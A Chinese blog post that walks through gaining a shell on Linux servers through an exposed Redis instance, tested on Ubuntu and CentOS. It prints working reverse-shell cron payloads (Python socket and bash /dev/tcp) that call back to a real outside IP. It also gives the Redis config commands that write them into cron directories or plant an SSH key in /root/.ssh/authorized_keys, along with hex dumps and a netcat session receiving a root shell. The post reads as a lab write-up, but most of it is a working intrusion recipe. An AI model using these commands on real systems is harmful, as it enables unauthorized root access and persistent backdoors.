---
title: 通过redis getshell的一些小问题
date: 2016-12-03 16:08:53
tags:
- redis
- crontab
categories:
- Blogs
---

之前在出AT Field的时候，在通过redis弹shell的过程中遇到一些问题，今天专门测试一下，解决一些疑惑

<!--more-->

这里我们不考虑如何写入redis中，只考虑从redis到服务器这个过程

使用两种反弹shell的方式，第一种是python弹的

```
* * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

第二种是直接弹的

```
*/1 * * * * /bin/bash -i >& /dev/tcp/xxxx/12345 0>&1
```

首先要明确第一点，用写入crontab的方式要求redis必须是root用户启动，我们可以看看2个配置文件的权限

```
root@fe8fb94b7fb1:/var/spool/cron/crontabs# ll
total 12
drwx-wx--T 2 root crontab 4096 Dec  3 08:17 ./
drwxr-xr-x 3 root root    4096 Dec  2 17:27 ../
-rw------- 1 root crontab 1341 Dec  3 06:47 root


root@fe8fb94b7fb1:/etc# ll crontab 
-rw-r--r-- 1 root root 722 Apr  5  2016 crontab

```

很明显如果redis是以redis用户运行的话，在save的时候会报error

# ubuntu系统 #

## crontab方式 ##

在debian系统下，首先我们得知道配置文件的位置
1、/etc/crontab
2、/var/spool/cron/crontab/   单个用户的crontab配置

我们先设置好键值
并写入payload1

```
127.0.0.1:6379> config set dir /var/spool/cron/crontab
(error) ERR Changing directory: No such file or directory
127.0.0.1:6379> config set dir /var/spool/cron/crontabs
OK
127.0.0.1:6379> config set dbfilename root
OK
127.0.0.1:6379> get 1
"* * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"115.28.78.16\",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
127.0.0.1:6379> save
OK

```

在迷一样的地方截断了
```
root@fe8fb94b7fb1:/var/spool/cron/crontabs# xxd root 
00000000: 5245 4449 5330 3030 36fe 0000 c001 c340  REDIS0006......@
00000010: c440 fb02 2a20 2aa0 011f 2f75 7372 2f62  .@..* *.../usr/b
00000020: 696e 2f70 7974 686f 6e20 2d63 2027 696d  in/python -c 'im
00000030: 706f 7274 2073 6f63 6b65 1574 2c73 7562  port socke.t,sub
00000040: 7072 6f63 6573 732c 6f73 2c73 7973 3b73  process,os,sys;s
00000050: 3d80 1a00 2e80 0600 2880 0608 2e41 465f  =.......(....AF_
00000060: 494e 4554 2ca0 0e1f 534f 434b 5f53 5452  INET,...SOCK_STR
00000070: 4541 4d29 3b73 2e63 6f6e 6e65 6374 2828  EAM);s.connect((
00000080: 2231 3135 2e32 382e 0737 382e 3136 222c  "115.28..78.16",
00000090: 3620 0019 2929 3b6f 732e 6475 7032 2873  6 ..));os.dup2(s
000000a0: 2e66 696c 656e 6f28 292c 3029 3b20 e00a  .fileno(),0); ..
000000b0: 1600 31e0 0d16 0432 293b 703d e001 ab07  ..1....2);p=....
000000c0: 2e63 616c 6c28 5b22 60db 0b73 6822 2c22  .call(["`..sh","
000000d0: 2d69 225d 293b 27ff 8c5e 76ca 1e73 7b64  -i"]);'..^v..s{d

```

好像很顺利
```
root@fe8fb94b7fb1:/var/spool/cron/crontabs# xxd root 
00000000: 5245 4449 5330 3030 36fe 0000 c001 3e0a  REDIS0006.....>.
00000010: 2a2f 3120 2a20 2a20 2a20 2a20 2f62 696e  */1 * * * * /bin
00000020: 2f62 6173 6820 2d69 203e 2620 2f64 6576  /bash -i >& /dev
00000030: 2f74 6370 2f31 3135 2e32 382e 3738 2e31  /tcp/115.28.78.1
00000040: 362f 3132 3334 3520 303e 2631 0aff 67eb  6/12345 0>&1..g.
00000050: 2a29 4e8b 2216                           *)N.".
```

但是完全等不到shell

```
root@iZ285ei82c1Z:~# nc -l -p 12345
```

我们尝试写入到**/etc/crontab**

这里有一点儿区别的是，在这里需要指明用户，也就是

```
*/1 * * * * root /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("115.28.78.16",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

python同样会发生神秘的截断，直接弹shell也是失败的，这里我们发现了一个问题，在redis中我们通过写入文件的形式，会在文件的开头和结尾写入部分格式头尾，这样crontab如果对格式要求严格，那么就不能成功执行crontab中的命令。


## 通过写入authorized_keys getshell ##

crontab尝试失败了，那么还有一种利用比较多的方式是通过写authorized_keys来get shell

这里我们修改了目录到/root/.ssh，然后写入公钥

```
127.0.0.1:6379> config set dir /root/.ssh
OK
127.0.0.1:6379> config set dbfilename authorized_keys
OK
127.0.0.1:6379> set 1 "\n\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAsJ4pbjXL5KnnX/FP6sZORaT3N8/A6SEYv23VfrIVoPdOCBVD98O+RExVWCe8Iknwzx3w1Hm2uWnB6i6AtCnIji3yz16HIPryzoLE65xN4Z2vGXZk2YmOuRtqFPKPk/QCdf1Vxh6lwLZRo2msYEK/+mziOrmYy1UzwqLxfl1uNYVYTs2jHGBEikPwA7FAt5ZVRRBhzDnn8dyT201FOwR/fpukiXbaevZU2/iyW+Qu9ssaZMJMpRzautNuZLxCmV9TfuP0NbsgCBHj1nOMf3BUQNXUtE4aCRP0gHbs18Wvpx5ryWyl/NWWQADOY2dMHMWuTtCxLSrfY/q+H8l+JGdQpw==\n\n"
OK
127.0.0.1:6379> save

```

看看十六进制

```
root@fe8fb94b7fb1:~/.ssh# xxd authorized_keys 
00000000: 5245 4449 5330 3030 36fe 0000 c001 4180  REDIS0006.....A.
00000010: 0a0a 7373 682d 7273 6120 4141 4141 4233  ..ssh-rsa AAAAB3
00000020: 4e7a 6143 3179 6332 4541 4141 4142 4977  NzaC1yc2EAAAABIw
00000030: 4141 4151 4541 734a 3470 626a 584c 354b  AAAQEAsJ4pbjXL5K
00000040: 6e6e 582f 4650 3673 5a4f 5261 5433 4e38  nnX/FP6sZORaT3N8
00000050: 2f41 3653 4559 7632 3356 6672 4956 6f50  /A6SEYv23VfrIVoP
00000060: 644f 4342 5644 3938 4f2b 5245 7856 5743  dOCBVD98O+RExVWC
00000070: 6538 496b 6e77 7a78 3377 3148 6d32 7557  e8Iknwzx3w1Hm2uW
00000080: 6e42 3669 3641 7443 6e49 6a69 3379 7a31  nB6i6AtCnIji3yz1
00000090: 3648 4950 7279 7a6f 4c45 3635 784e 345a  6HIPryzoLE65xN4Z
000000a0: 3276 4758 5a6b 3259 6d4f 7552 7471 4650  2vGXZk2YmOuRtqFP
000000b0: 4b50 6b2f 5143 6466 3156 7868 366c 774c  KPk/QCdf1Vxh6lwL
000000c0: 5a52 6f32 6d73 5945 4b2f 2b6d 7a69 4f72  ZRo2msYEK/+mziOr
000000d0: 6d59 7931 557a 7771 4c78 666c 3175 4e59  mYy1UzwqLxfl1uNY
000000e0: 5659 5473 326a 4847 4245 696b 5077 4137  VYTs2jHGBEikPwA7
000000f0: 4641 7435 5a56 5252 4268 7a44 6e6e 3864  FAt5ZVRRBhzDnn8d
00000100: 7954 3230 3146 4f77 522f 6670 756b 6958  yT201FOwR/fpukiX
00000110: 6261 6576 5a55 322f 6979 572b 5175 3973  baevZU2/iyW+Qu9s
00000120: 7361 5a4d 4a4d 7052 7a61 7574 4e75 5a4c  saZMJMpRzautNuZL
00000130: 7843 6d56 3954 6675 5030 4e62 7367 4342  xCmV9TfuP0NbsgCB
00000140: 486a 316e 4f4d 6633 4255 514e 5855 7445  Hj1nOMf3BUQNXUtE
00000150: 3461 4352 5030 6748 6273 3138 5776 7078  4aCRP0gHbs18Wvpx
00000160: 3572 7957 796c 2f4e 5757 5141 444f 5932  5ryWyl/NWWQADOY2
00000170: 644d 484d 5775 5474 4378 4c53 7266 592f  dMHMWuTtCxLSrfY/
00000180: 712b 4838 6c2b 4a47 6451 7077 3d3d 0a0a  q+H8l+JGdQpw==..
00000190: ff17 7956 a743 a92c 3f                   ..yV.C.,?

```

成功连入了，有效

# centos #

这里我首先使用了centos7下的实体机来测试。

先写入
```
root@edward ~]# redis-cli 
redis 127.0.0.1:6379> set 1 "\n*/1 * * * * /bin/bash -i >& /dev/tcp/115.28.78.16/12345 0>&1\n"
OK
redis 127.0.0.1:6379> config set dir /var/spool/cron
OK
redis 127.0.0.1:6379> config set dbfilename root
OK
redis 127.0.0.1:6379> save
OK
```

然后看看内容

```
[root@edward cron]# xxd root
0000000: 5245 4449 5330 3030 32fe 0000 c001 3e0a  REDIS0002.....>.
0000010: 2a2f 3120 2a20 2a20 2a20 2a20 2f62 696e  */1 * * * * /bin
0000020: 2f62 6173 6820 2d69 203e 2620 2f64 6576  /bash -i >& /dev
0000030: 2f74 6370 2f31 3135 2e32 382e 3738 2e31  /tcp/115.28.78.1
0000040: 362f 3132 3334 3520 303e 2631 0aff       6/12345 0>&1..

```

成功了

```
root@iZ285ei82c1Z:~# nc -l -p 12345
bash: no job control in this shell
[root@edward ~]# whoami
whoami
root
```

试试python的

```
redis 127.0.0.1:6379> set 1 "*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket
OK
redis 127.0.0.1:6379> config set dir /var/spool/cron
OK
redis 127.0.0.1:6379> config set dbfilename root
OK
redis 127.0.0.1:6379> save
OK
```

好像还是被截断了
```
[root@edward cron]# xxd root 
0000000: 5245 4449 5330 3030 32fe 0000 c001 c340  REDIS0002......@
0000010: c840 ff05 0a2a 2f31 202a a001 1f2f 7573  .@...*/1 *.../us
0000020: 722f 6269 6e2f 7079 7468 6f6e 202d 6320  r/bin/python -c 
0000030: 2769 6d70 6f72 7420 736f 636b 6515 742c  'import socke.t,
0000040: 7375 6270 726f 6365 7373 2c6f 732c 7379  subprocess,os,sy
0000050: 733b 733d 801a 002e 8006 0028 8006 082e  s;s=.......(....
0000060: 4146 5f49 4e45 542c a00e 1f53 4f43 4b5f  AF_INET,...SOCK_
0000070: 5354 5245 414d 293b 732e 636f 6e6e 6563  STREAM);s.connec
0000080: 7428 2822 3131 352e 3238 2e07 3738 2e31  t(("115.28..78.1
0000090: 3622 2c36 2000 1929 293b 6f73 2e64 7570  6",6 ..));os.dup
00000a0: 3228 732e 6669 6c65 6e6f 2829 2c30 293b  2(s.fileno(),0);
00000b0: 20e0 0a16 0031 e00d 1604 3229 3b70 3de0   ....1....2);p=.
00000c0: 01ab 072e 6361 6c6c 285b 2260 db0c 7368  ....call(["`..sh
00000d0: 222c 222d 6922 5d29 3b27 0aff            ","-i"]);'..

```

当然也没有被执行。

最后我们尝试写入公钥的方式

```
redis 127.0.0.1:6379> OMf3BUQNXUtE4aCRP0gHbs18Wvpx5ryWyl/NWWQADOY2dMHMWuTtCxLSrfY/q+H8l+JGdQpw==\n\n"
OK
redis 127.0.0.1:6379> config set dir /root/.ssh
OK
redis 127.0.0.1:6379> config set dbfilename authorized_keys
OK
redis 127.0.0.1:6379> save
OK

```

成功了

```
[root@edward .ssh]# xxd authorized_keys 
0000000: 5245 4449 5330 3030 32fe 0000 c001 4180  REDIS0002.....A.
0000010: 0a0a 7373 682d 7273 6120 4141 4141 4233  ..ssh-rsa AAAAB3
0000020: 4e7a 6143 3179 6332 4541 4141 4142 4977  NzaC1yc2EAAAABIw
0000030: 4141 4151 4541 734a 3470 626a 584c 354b  AAAQEAsJ4pbjXL5K
0000040: 6e6e 582f 4650 3673 5a4f 5261 5433 4e38  nnX/FP6sZORaT3N8
0000050: 2f41 3653 4559 7632 3356 6672 4956 6f50  /A6SEYv23VfrIVoP

```

